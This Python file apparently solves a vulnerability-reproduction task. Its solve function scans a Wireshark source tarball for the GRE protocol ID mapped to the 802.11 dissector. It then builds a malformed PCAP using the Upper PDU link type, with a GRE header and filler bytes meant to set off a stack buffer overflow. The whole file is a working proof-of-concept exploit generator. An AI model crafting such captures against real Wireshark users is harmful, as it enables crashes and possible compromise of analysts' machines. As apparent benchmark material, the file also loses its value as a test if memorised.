import tarfile
import re
import struct
import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Stack Buffer Overflow vulnerability in Wireshark
        specifically involving the GRE dissector invoking the 802.11 dissector.
        """
        
        # Default GRE protocol for 802.11 if scanning fails.
        # ETHERTYPE_IEEE_802_11 is typically 0x890d.
        gre_proto_id = 0x890d 
        
        try:
            # Parse the source code to find the exact value registered in gre.proto
            with tarfile.open(src_path, 'r') as tar:
                defines = {}
                c_files = []
                h_files = []
                
                # Filter files to read
                for member in tar.getmembers():
                    if member.name.endswith('etypes.h'):
                        h_files.append(member)
                    elif member.name.endswith('.c') and ('packet-wlan' in member.name or 'packet-ieee80211' in member.name):
                        c_files.append(member)
                
                # Extract definitions from headers (e.g., ETHERTYPE_IEEE_802_11)
                for member in h_files:
                    f = tar.extractfile(member)
                    if f:
                        content = f.read().decode('utf-8', errors='ignore')
                        # Regex to capture #define NAME VALUE
                        for match in re.finditer(r'^\s*#define\s+(\w+)\s+(0x[0-9a-fA-F]+|\d+)', content, re.MULTILINE):
                            defines[match.group(1)] = int(match.group(2), 0)
                            
                # Search for dissector_add_uint("gre.proto", ...) in C files
                found = False
                for member in c_files:
                    if found: break
                    f = tar.extractfile(member)
                    if f:
                        content = f.read().decode('utf-8', errors='ignore')
                        # Regex to find registration lines
                        for match in re.finditer(r'dissector_add_uint\s*\(\s*"gre\.proto"\s*,\s*([a-zA-Z0-9_]+)\s*,\s*([a-zA-Z0-9_]+)\s*\)', content):
                            val_str = match.group(1).strip()
                            handle_str = match.group(2).strip()
                            
                            # Check if the handle relates to WLAN/802.11
                            if 'wlan' in handle_str.lower() or '80211' in handle_str.lower():
                                if val_str.startswith('0x') or val_str.isdigit():
                                    gre_proto_id = int(val_str, 0)
                                    found = True
                                elif val_str in defines:
                                    gre_proto_id = defines[val_str]
                                    found = True
                                break
        except Exception:
            # Fallback to default if any error occurs during source analysis
            pass

        # Construct a PCAP file using DLT_WIRESHARK_UPPER_PDU (252)
        # This link type allows injecting a packet directly into a specific dissector ("gre").
        
        # 1. Upper PDU Header
        # Structure: Tag(2), Len(2), Value(...), Tag(2), Len(2)
        # Tag 12 = DISSECTOR_NAME
        # Value = "gre\0" (length 4)
        # Tag 0 = END_OF_OPT
        upper_pdu_header = struct.pack('>HH4sHH', 12, 4, b'gre\x00', 0, 0)
        
        # 2. GRE Header
        # Flags/Version (2 bytes): 0x0000 (Basic GRE)
        # Protocol (2 bytes): The ID mapped to 802.11
        gre_header = struct.pack('>HH', 0x0000, gre_proto_id)
        
        # 3. Payload (Simulated 802.11 data)
        # The crash occurs because the 802.11 dissector expects a pseudoheader,
        # but receives GRE flags/version. It then processes the packet data.
        # We provide enough garbage data to trigger the subsequent overflow/crash.
        payload = b'A' * 32
        
        packet_data = upper_pdu_header + gre_header + payload
        
        # 4. PCAP Global Header
        # Magic (0xa1b2c3d4), Major(2), Minor(4), Zone(0), SigFigs(0), SnapLen(65535), LinkType(252)
        global_header = struct.pack('<IHHIIII', 0xa1b2c3d4, 2, 4, 0, 0, 65535, 252)
        
        # 5. PCAP Packet Header
        # Timestamp Sec(0), USec(0), CapLen(len), Len(len)
        pkt_header = struct.pack('<IIII', 0, 0, len(packet_data), len(packet_data))
        
        return global_header + pkt_header + packet_data